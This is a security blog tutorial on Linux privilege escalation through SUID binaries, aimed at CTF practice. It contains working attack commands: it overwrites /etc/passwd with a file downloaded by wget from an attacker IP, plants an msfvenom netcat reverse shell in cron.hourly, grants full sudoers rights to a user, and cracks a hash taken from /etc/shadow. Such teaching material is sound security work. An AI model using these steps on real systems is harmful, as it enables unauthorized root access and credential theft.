@@ -1,0 +1,173 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
+            <h1 class="post-title entry-title">Linux Privilege Escalation using SUID Binaries</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/" rel="bookmark"><time class="entry-date published" datetime="2018-05-16T18:28:05+00:00">May 16, 2018</time><time class="updated" datetime="2025-06-08T12:38:50+00:00">June 8, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In our<span style="color: #3366ff;"> <a style="color: #3366ff;" href="//www.hackingarticles.in/privilege-escalation-in-linux-using-etc-passwd-file/">previous</a> </span>article we have discussed “Privilege Escalation in Linux using etc/passwd file” and today we will learn “Privilege Escalation in Linux using SUID Permission.” While solving CTF challenges we always check suid permissions for any file or command for privilege escalation. It is very important to know <strong>what</strong> SUID is, <strong>how</strong> to set SUID and <strong>how </strong>SUID helps in privilege escalation. You can read our previous article where we had applied this trick for privilege escalation. Open the links given below:</span></p>
+<p class="ai-optimize-7"><span style="color: #000000;"><a style="color: #000000;" href="//www.hackingarticles.in/hack-the-box-challenge-bank-walkthrough/"><span style="color: #3366ff;">Link 1</span>:</a>  Hack the Box Challenge: Bank Walkthrough</span></p>
+<p class="ai-optimize-8"><span style="color: #000000;"><a style="color: #000000;" href="//www.hackingarticles.in/hack-the-box-challenge-haircut-walkthrough/"><span style="color: #3366ff;">Link 2</span>:</a> Hack the Box Challenge: Haircut Walkthrough</span></p>
+<h4 class="ai-optimize-9"><span style="color: #000000;">Let’s Start with Theoretical Concept !!</span></h4>
+<p class="ai-optimize-10"><span style="color: #000000;">As we all know in Linux everything is a file, including directories and devices which have permissions to allow or restrict three operations i.e. read/write/execute. So when you set permission for any file, you should be aware of the Linux users to whom you allow or restrict all three permissions. Take a look at the following image.</span></p>
+<p class="ai-optimize-11"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-3On44xqaRWQ/WvxyU2oXLII/AAAAAAAAW3g/ms6yFU_xJ_E1WxrCTHJsZX7j53D1aJdVACLcBGAs/s1600/0.1.png"/></span></p>
+<p class="ai-optimize-12"><span style="color: #000000;">Hence it is clear that the maximum number of bit is used to set permission for each user is <strong>7</strong>, which is a combination of read (<strong>4</strong>) write (<strong>2</strong>) and execute (<strong>1</strong>) operation. For example, if you set chmod 755, then it will look like as <strong>rwxr-xr-x.</strong></span></p>
+<p class="ai-optimize-13"><span style="color: #000000;">But when special permission is given to each user it becomes <strong>SUID, SGID, and sticky bits</strong>. When extra bit <strong>“4”</strong> is set to user(Owner) it becomes <strong>SUID</strong> (Set user ID) and when bit <strong>“2”</strong> is set to group it becomes <strong>SGID</strong> (Set Group ID) and  if other users are allowed to create or delete any file inside a directory then <strong>sticky bits</strong> <strong>“1”</strong> is set to that directory.</span></p>
+<p class="ai-optimize-14"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-V6G2dcR6rew/WvxyU3zB5NI/AAAAAAAAW3o/es8P06opgNwUg8gUPjzcLO29dgVYBOOpQCLcBGAs/s1600/0.2.png"/></span></p>
+<p> </p>
+<h3 class="ai-optimize-15"><span style="color: #800000;">What is SUID Permission?</span></h3>
+<p class="ai-optimize-16"><span style="color: #000000;"><strong>SUID:</strong> Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Those files which have suid permissions run with higher privileges.  Assume we are accessing the target system as a non-root user and we found suid bit enabled binaries, then those file/program/command can run with root privileges.<strong> </strong></span></p>
+<h4 class="ai-optimize-17"><span style="color: #000000;">How to set suid?</span></h4>
+<p class="ai-optimize-18"><span style="color: #000000;">Basically, you can change the permission of any file either using the “Numerical” method or “Symbolic” method. As result, it will <strong>replace x from s</strong> as shown in the below image which denotes especial execution permission with the higher privilege to a particular file/command. Since we are enabling SUID for Owner (user) therefore <strong>bit 4</strong> or <strong>symbol s</strong> will be added before read/write/execution operation.</span></p>
+<p class="ai-optimize-19"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-a6Pqx7k0g4o/WvxyU6zyHDI/AAAAAAAAW3k/5XoCsMKnS7o9OsnJL4BgMLF584zaJ2LrwCLcBGAs/s1600/0.3.png"/></span></p>
+<p> </p>
+<p class="ai-optimize-20"><span style="color: #000000;">If you execute <strong>ls -al</strong> with the file name and then you observe the small ‘s’ symbol as in the above image, then its means SUID bit is enabled for that file and can be executed with root privileges.</span></p>
+<h3 class="ai-optimize-21"><span style="color: #800000;">How to Find SUID Files</span></h3>
+<p class="ai-optimize-22"><span style="color: #000000;">By using the following command you can enumerate all binaries having SUID permissions:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -perm -u=s -type f 2&gt;/dev/null</pre>
+<ul>
+<li class="ai-optimize-23"><span style="color: #000000;"><strong>/</strong>denotes  start from the top (root) of the file system and find every directory</span></li>
+<li class="ai-optimize-24"><span style="color: #000000;"><strong>-perm </strong>denotes search for the permissions that follow</span></li>
+<li class="ai-optimize-25"><span style="color: #000000;"><strong>-u=s</strong>denotes look for files that are owned by the root user</span></li>
+<li class="ai-optimize-26"><span style="color: #000000;"><strong>-type</strong>states the type of file we are looking for</span></li>
+<li class="ai-optimize-27"><span style="color: #000000;"><strong>f </strong>denotes a regular file, not the directories or special files</span></li>
+<li class="ai-optimize-28"><span style="color: #000000;"><strong>2 </strong>denotes to the second file descriptor of the process, i.e. stderr (standard error)</span></li>
+<li class="ai-optimize-29"><span style="color: #000000;"><strong>&gt;</strong> means redirection</span></li>
+<li class="ai-optimize-30"><span style="color: #000000;"><strong>/dev/null</strong> is a special filesystem object that throws away everything written into it.</span></li>
+</ul>
+<h3 class="ai-optimize-31"><span style="color: #800000;">HOW SUID helps in privilege escalation?</span></h3>
+<p class="ai-optimize-32"><span style="color: #000000;">In Linux, some of the existing binaries and commands can be used by non- root users to escalate root access privileges if the SUID bit is enabled. There are some famous Linux / Unix executable commands that can allow privilege escalation: Bash, Cat, cp, echo, find, Less, More, Nano, Nmap, Vim and etc</span></p>
+<p class="ai-optimize-33"><span style="color: #000000;">Visit here more:<span style="color: #3366ff;"> <a href="//gtfobins.github.io/#+sudo">//gtfobins.github.io/#+sudo</a></span></span></p>
+<p class="ai-optimize-34"><span style="color: #000000;">Let’s get deep through practical work. First, <strong>create a user</strong> that should not be a sudo group user. Here, we have added user “ignite” whose UID is 1001 and GID is 1001 and therefore ignite is a non- root user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">adduser ignite</pre>
+<p class="ai-optimize-35"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-OAzIN7-WWwQ/WvxyVfOXLHI/AAAAAAAAW3s/ictB-Ge8ZF8J1rXK3v5x-pFcaaNBssdhgCLcBGAs/s1600/1.png"/></span></p>
+<h3 class="ai-optimize-36"><span style="color: #000000;"><span style="color: #800000;">Privilege Escalation using the copy command</span></span></h3>
+<p class="ai-optimize-37"><span style="color: #000000;">If suid bit is enabled for the <strong>cp command</strong>, which is used to copy the data, it can lead to an escalation privilege to gain root access. </span></p>
+<p class="ai-optimize-38"><span style="color: #000000;">For example, suppose you (system admin) want to give cp command SUID permission. Then you can follow the steps below to identify its location and current permission, after which you can enable SUID bit by changing permission. </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">which cp
+ls -al /bin/cp
+chmod u+s /bin/cp</pre>
+<p class="ai-optimize-39"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-9BWxuZ5W10w/WvxyXlTARxI/AAAAAAAAW4U/YornxM5G42AeaVRmDMaF7cdWS_zFwvRmQCLcBGAs/s1600/2.png"/></span></p>
+<h4 class="ai-optimize-40"><span style="color: #000000;">1<sup>st</sup> Method</span></h4>
+<p class="ai-optimize-41"><span style="color: #000000;">On the other hand, start your attacking machine and first compromise the target system and then move to the privilege escalation phase. Suppose I successfully log into the victim’s machine via ssh and access the non-root user terminal. Then by using the following command, you can list all binaries with SUID permission. </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -perm -u=s -type f 2&gt;/dev/null</pre>
+<p class="ai-optimize-42"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-iY8NhmO669A/WvxybEsWJ3I/AAAAAAAAW5E/9Q-z5UZXXmUsm5AZpLhuJOk_zsXV6o8ZgCLcBGAs/s1600/4.png"/></span></p>
+<p class="ai-optimize-43"><span style="color: #000000;">In the above image, you can observe that it is showing so many files but we are interested in /bin/cp file. Because now we can copy /etc/passwd file for reading user list. Therefore I copy /passwd file inside the HTML directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cp /etc/passwd /var/www/html</pre>
+<p class="ai-optimize-44"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-v14x483xz4s/WvxybS-uCGI/AAAAAAAAW5I/FibMl1y4P_8plvBq-HBqg6FCom3-UQD5QCLcBGAs/s1600/5.png"/></span></p>
+<p class="ai-optimize-45"><span style="color: #000000;">On other hands, we have generated a new encrypted password: pass123 using OpenSSL passwd</span></p>
+<p class="ai-optimize-46"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-VDAaVMoyUcY/Wvxybu8ZBxI/AAAAAAAAW5M/WYLHlBekkxsuYZ1ktBOr-nRqpvbGI4aeQCLcBGAs/s1600/6.png"/></span></p>
+<p class="ai-optimize-47"><span style="color: #000000;">We have copied the /passwd file into the web directory, i.e. /var/www/html, so I can open it through the web browser and then copy the entire contents of the /passwd file into a text file and then add our own user with root UID, GID, and directory.</span></p>
+<p class="ai-optimize-48"><span style="color: #000000;">In our <span style="color: #3366ff;"><a style="color: #3366ff;" href="//www.hackingarticles.in/privilege-escalation-in-linux-using-etc-passwd-file/">previous article</a></span>, we have already discussed how to add a user /etc/passwd using the OpenSSL passwd utility.</span></p>
+<p class="ai-optimize-49"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-axd9mUd65nM/WvxycFPrcAI/AAAAAAAAW5Q/ttD38Zdk86MsuEurBeaS6SyvcgvObDvaACLcBGAs/s1600/7.png"/></span></p>
+<p class="ai-optimize-50"><span style="color: #000000;">Run Python HTTP server for transferring our edited passwd file into target’s machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
+<p class="ai-optimize-51"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-X1hHbCWFPaM/WvxycO25OhI/AAAAAAAAW5U/Ni7HM1HYdkInY46C6yd8pUwWBWz5EawkgCLcBGAs/s1600/8.png"/></span></p>
+<p class="ai-optimize-52"><span style="color: #000000;">As we all know, the /tmp directory has all permission to create or delete any file, so we have downloaded our passwd file inside it. After it is downloaded, we have copied the /tmp/passwd data to /etc/passwd as a result, it will overwrite the original passwd file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
+wget //192.168.1.108/passwd
+cp passwd /etc/passwd</pre>
+<p class="ai-optimize-53"><span style="color: #000000;">With the help of tail command, we ensured that our user “hack” is either the part of /etc/passwd file. Since we have added our own user with root privileges let’s get into the root directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">su hack
+whoami</pre>
+<p class="ai-optimize-54"><span style="color: #000000;">And Yessssssss !! This is an incredible way to escalated root privilege.</span></p>
+<p class="ai-optimize-55"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-A4ck8bhTQnc/WvxyckMsi5I/AAAAAAAAW5Y/GZ8ZbA_EIS0Nd7etJCChmhwt5VXl8o6jgCLcBGAs/s1600/9.png"/></span></p>
+<h4 class="ai-optimize-56"><span style="color: #000000;">2<sup>nd</sup> Method</span></h4>
+<p class="ai-optimize-57"><span style="color: #000000;">Similarly, if SUID bit is enabled for the cp command, we can also transfer our backdoor to the target system. Here, we have generated netcat backdoor for reverse connection using the msfvenom command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.108 lport=1234 R</pre>
+<p class="ai-optimize-58"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-1KNXzT9bh3g/WvxyVX_ygnI/AAAAAAAAW3w/Wc5qzOCOpME7sqifVHvTmtsCzkA9D-T2wCLcBGAs/s1600/10.png"/></span></p>
+<p class="ai-optimize-59"><span style="color: #000000;">Then copy the above highlighted code and paste it into a text file by editing #! /bin/bash, then ready to transfer it to the target system, I saved it as <strong>raj.sh.</strong></span></p>
+<p class="ai-optimize-60"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-c4pCz4EBEPM/WvxyVnGdbgI/AAAAAAAAW30/rKNcBck6CdAwU8cOBw2k381eEBFE_eKBACLcBGAs/s1600/11.1.png"/></span></p>
+<p class="ai-optimize-61"><span style="color: #000000;">Now we are all aware of the Linux crontab utility that runs files hourly, daily, weekly and monthly, so I copied raj.sh to /etc/cron.hourly, so it will run raj.sh after one hour.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cp raj.sh /etc/cron.hourly/
+ls -al /etc/cron.hourly/</pre>
+<p class="ai-optimize-62"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-IZbwHF6Knf0/WvxyV4_0ozI/AAAAAAAAW34/ZwT5UHJkIKI42vlEeoNBC9bI2s8HVjxAQCLcBGAs/s1600/12.png"/></span></p>
+<p class="ai-optimize-63"><span style="color: #000000;">Other hands we started Netcat listener in a new terminal and as the hour past it gives reverse connection of the target’s system with root privileges.</span></p>
+<p class="ai-optimize-64"><span style="color: #000000;">Hence we saw how a single cp command can lead to privilege escalation if SUID bit is ON. You can try your own way to escalated root privilege using cp command.</span></p>
+<p class="ai-optimize-65"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-ek0qY2yI0E0/WvxyWPV7beI/AAAAAAAAW38/6YCxTtWU5vwUq8yh8PhcIvV55DsNBHDZwCLcBGAs/s1600/13.1.png"/></span></p>
+<h3 class="ai-optimize-66"><span style="color: #800000;">Privilege Escalation Using Find Command </span></h3>
+<p class="ai-optimize-67"><span style="color: #000000;">Similarly, we can escalate root privilege if SUID bit is ON for /usr/bin/<em>find</em>. </span></p>
+<p class="ai-optimize-68"><span style="color: #000000;">For example, suppose you (system admin) want to give SUID permission for Find command. Then you can use <em>which comman</em>d to identify its location and current permission after then you can enable SUID bit by changing permission.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">which find
+ls -al /usr/bin/find
+chmod u+s /usr/bin/find</pre>
+<p class="ai-optimize-69"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-Mq_nAjRBjyU/WvxyWDgiz3I/AAAAAAAAW4A/TdwC68202U8v6BDayNYAEbf-i4QOHAu5gCLcBGAs/s1600/13.png"/></span></p>
+<p class="ai-optimize-70"><span style="color: #000000;">Again compromise the target system and then move for privilege escalation phase as done above. Then by using the following command, you can enumerate all binaries having SUID permission.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -perm -u=s -type f 2&gt;/dev/null</pre>
+<p class="ai-optimize-71"><span style="color: #000000;">So here we came to know that SUID bit is enabled to find command which means we can execute any command within find command. To do so first we create an empty file “raj” and then run the whoami command as shown below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">touch raj
+find raj -exec "whoami" \;</pre>
+<p class="ai-optimize-72"><span style="color: #000000;">If an attacker successfully enumerated SUID bit for /usr/bin/find then it will allow him to execute any malicious command such netcat bin/bash shell or may fetch important system information for privilege escalation.</span></p>
+<p><img decoding="async" src="//3.bp.blogspot.com/-wby8QCDIggs/WvxyWYI0tsI/AAAAAAAAW4E/nTZCNCTutAYFWV_7lFCuEc_iVq_xqDJiACLcBGAs/s1600/14.png"/></p>
+<h3 class="ai-optimize-73"><span style="color: #800000;">Privilege Escalation Using Vim editor</span></h3>
+<p class="ai-optimize-74"><span style="color: #000000;">Similarly, we can escalate root privilege if SUID bit is ON for Vim editor. For example, suppose you (system admin) want to give SUID permission for Vim editor. Then you can use<em> “which”</em> command to identify its location and current permission after then you can enable SUID bit by changing permission.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">which vim
+ls -al /usr/bin/vim
+ls -al /etc/alternatives/vim
+chmod u+s /usr/bin/vim.basic</pre>
+<p class="ai-optimize-75"><span style="color: #000000;">You will found vim.basic through symlinking as shown in the below image.</span></p>
+<p class="ai-optimize-76"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-8QyjAhfMZ14/WvxyW8mTr9I/AAAAAAAAW4M/9clrfSeu9LsZq8xaLRfUxp3Y9N6RDCj6wCLcBGAs/s1600/15.png"/></span></p>
+<p class="ai-optimize-77"><span style="color: #000000;">Again compromise the target system and then move for privilege escalation phase as done above. Then by using the following command, you can enumerate all binaries who’s having SUID permission.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -perm -u=s -type f 2&gt;/dev/null</pre>
+<p class="ai-optimize-78"><span style="color: #000000;">So here we came to know that SUID bit is enabled for /usr/bin/vim.basic and hence now we can edit any file which through vim that can be editable only by sudo or root user.</span></p>
+<p class="ai-optimize-79"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-gyJKVaOiBTA/WvxyW-RwfcI/AAAAAAAAW4I/swC0zqxRSQ8e-DIBOoxh9M2qnyBWlR9cgCLcBGAs/s1600/16.png"/></span></p>
+<p class="ai-optimize-80"><span style="color: #000000;">As we know ignite is non-root user who has least permissions, since vim has SUID permission, therefore, we can edit the <strong>sudoers file</strong> through it and can change permissions for user “ignite”. So we open sudoers file by typing <strong>visudo command</strong> and give all permission to user “ignite” as shown in the image.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ignite   ALL=(ALL:ALL) ALL</pre>
+<p class="ai-optimize-81"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-VlkK5GvWYNY/WvxyXAVHafI/AAAAAAAAW4Q/8IRLQpMq0JEPC5p2sVO4k2tJRcf7-eJuwCLcBGAs/s1600/17.png"/></span></p>
+<p class="ai-optimize-82"><span style="color: #000000;">Now let access root directory as shown in below image.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l
+sudo bash
+id</pre>
+<p class="ai-optimize-83"><span style="color: #000000;"><strong> </strong>Great!! This trick also works superbly for privilege escalation.</span></p>
+<p class="ai-optimize-84"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-ata-Lhvk0jQ/WvxyXgPUztI/AAAAAAAAW4Y/d8LRRZny-MAxt6WAej996r5OeeNyG6LpQCLcBGAs/s1600/18.png"/></span></p>
+<h3 class="ai-optimize-85"><span style="color: #800000;">Privilege Escalation using Saved Script</span></h3>
+<p class="ai-optimize-86"><span style="color: #000000;">There are maximum chances to get any kind of script for the system or program call, it can be any script either PHP, Python or C language script. Suppose you (system admin) want to give SUID permission to a C language script which will provide bash shell on execution.</span></p>
+<p class="ai-optimize-87"><span style="color: #000000;">So here we have coded a c program which will call system for bash shell and saved it as “asroot.c”.</span></p>
+<p class="ai-optimize-88"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-PqTZIanw9No/WvxyX47olsI/AAAAAAAAW4c/0kvDBAhDfQYmc4XlB7TXeUI1dr-3vQu5gCLcBGAs/s1600/19.png"/></span></p>
+<p class="ai-optimize-89"><span style="color: #000000;">Then create a rootshell directory inside /bin directory and copy the asroot.c file in the rootshell directory then run gcc compiler for compilation.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir /bin/rootshell
+cd /bin/rootshell
+cp /home/raj/Desktop/asroot.c .
+ls
+gcc asroot.c -o shell
+chmod u+s shell
+ls -al shell</pre>
+<p class="ai-optimize-90"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-aUnXHSZwWuE/WvxyYnUK3oI/AAAAAAAAW4k/UiNPlFvD3rEx7UGpSUm6LESmYTp2tbUQwCLcBGAs/s1600/20.png"/></span></p>
+<p class="ai-optimize-91"><span style="color: #000000;">Now again compromise the target’s system and use find command to identify binaries having SUID permission.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic"> find / -perm -u=s -type f 2&gt;/dev/null</pre>
+<p class="ai-optimize-92"><span style="color: #000000;">So here we came to know that SUID bit is enabled for so many binary files but we are interested in /bin/rootshell/shell. So we move into /bin/rootshell directory and run the “shell” script, as result, we get root access as shown below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /bin/rootshell/shell
+./shell
+id</pre>
+<p class="ai-optimize-93"><span style="color: #000000;">Hence we saw how we can escalate root privilege if SUID bit is enabled for any script, although it is not possible to get such a script that calls bash shell if you found any script with SUID permission then using above techniques you can modify the contents of that script to get the bash shell.</span></p>
+<p class="ai-optimize-94"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-yYeNhfClOXE/WvxyYmiPEII/AAAAAAAAW4o/ZMHF3Fa-M4AnC_TdrVxSrN7cvsrHaBnfgCLcBGAs/s1600/21.png"/></span></p>
+<h3 class="ai-optimize-95"><span style="color: #800000;">Privilege Escalation using Nano Editor</span></h3>
+<p class="ai-optimize-96"><span style="color: #000000;">Similarly, we can escalate root privilege if SUID bit is ON for nano editor. For example, suppose you (system admin) want to give SUID permission for nano editor. Then you may follow the below steps to identify its location and current permission so that you can enable SUID bit by changing permission.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">which nano
+ls -al /bin/nano
+chmod u+s /bin/nano</pre>
+<p class="ai-optimize-97"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-DCQh9Nrv190/WvxyYVzva6I/AAAAAAAAW4g/BIQ8rbhgYSMFSByffYkbXSb-9GJV4TjCgCLcBGAs/s1600/22.png"/></span></p>
+<p class="ai-optimize-98"><span style="color: #000000;">Again, compromise the target system and then move for privilege escalation phase as done above. Then by using the following command, you can enumerate all binaries having SUID permission.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -perm -u=s -type f 2&gt;/dev/null</pre>
+<p class="ai-optimize-99"><span style="color: #000000;">So here we came to know that SUID bit is enabled for /bin/nano and now let’s open /etc/passwd file to edit own user as done above by using OpenSSL passwd.</span></p>
+<p class="ai-optimize-100"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-CLMQ6lkYo3k/WvxyZDWMZVI/AAAAAAAAW4w/P0iRGA5tdfsmp2Y3zKYsrTck-efg_CfvQCLcBGAs/s1600/23.png"/></span></p>
+<p class="ai-optimize-101"><span style="color: #000000;">On other hands, I have generated a new encrypted password: 123 using OpenSSL passwd</span></p>
+<p class="ai-optimize-102"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-KPdDjG0ppRM/WvxyZJW8ztI/AAAAAAAAW4s/2cK2zXkMSE4zrpnj1sK7aHcKzXEMia-KgCLcBGAs/s1600/24.png"/></span></p>
+<p class="ai-optimize-103"><span style="color: #000000;">Now open the passwd file with nano editor and add your own user as done above. Here you can observe I have created <strong>demo user</strong> with an encrypted password in the victim’s system.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/passwd</pre>
+<p class="ai-optimize-104"><span style="color: #000000;">Since we have added our own user with root privileges let’s get into the root directory.</span></p>
+<p class="ai-optimize-105"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-ionwhxOvijc/WvxyZsuSreI/AAAAAAAAW40/7uIJpx80bKQyQ_eU_zm5ptlrRyywrhUSQCLcBGAs/s1600/25.png"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">su demo
+id</pre>
+<p class="ai-optimize-106"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-4Bst583jqt4/WvxyaK3V9EI/AAAAAAAAW44/UVNtkH3kIpcLeK6rTBb-TZavrH_rCj8XACLcBGAs/s1600/26.png"/></span></p>
+<h4 class="ai-optimize-107"><span style="color: #800000;"><span style="color: #000000;">2<sup>nd</sup> Method</span> </span></h4>
+<p class="ai-optimize-108"><span style="color: #000000;">If suid bit is enabled for /bin/nano then we can steal the password from inside /etc/shadow file. So after compromising target’s machine. We had opened shadow file in nano editor and copy the encrypted password set for user: raj.</span></p>
+<p class="ai-optimize-109"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-b1LASTCbvRM/WvxyadmQNBI/AAAAAAAAW48/aVZ4b2kQx9olM5QmgfM8xTVY1EepceuKACLcBGAs/s1600/27.png"/></span></p>
+<p class="ai-optimize-110"><span style="color: #000000;">Now, paste above copy code into a text file and save it as a hash on the desktop. Then used John the Ripper to decode it as shown below. It has given raj: 123 as password, now try to log in into target’s system through raj account.</span></p>
+<p class="ai-optimize-111"><span style="color: #000000;">So Today, we have demonstrated how the SUID permission can lead to privilege escalation. Even when it is allowed to a normal copy, cat, nano, vim and so commands and programs.</span></p>
+<p class="ai-optimize-112"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-I21Bcs3-DgM/Wvxya5pdyNI/AAAAAAAAW5A/2dBHmM21WRsvBoXc4ZDxxU14No2wWB0kACLcBGAs/s1600/28.png"/></span></p>
+<p class="ai-optimize-113"><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles, an Information Security Consultant, Social Media Lover, and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
